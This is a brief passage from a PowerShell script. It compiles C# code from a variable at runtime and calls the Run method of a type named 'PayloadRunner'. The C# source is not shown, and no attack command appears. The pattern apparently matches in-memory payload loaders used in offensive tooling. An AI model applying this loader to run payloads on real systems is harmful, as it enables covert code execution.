...
# PassThru directly captures compiled types without needing GetType()
$compiledTypes = Add-Type -TypeDefinition $code -Language CSharp -PassThru
$runnerType = $compiledTypes | Where-Object { $_.Name -eq "PayloadRunner" }
$runnerType::Run()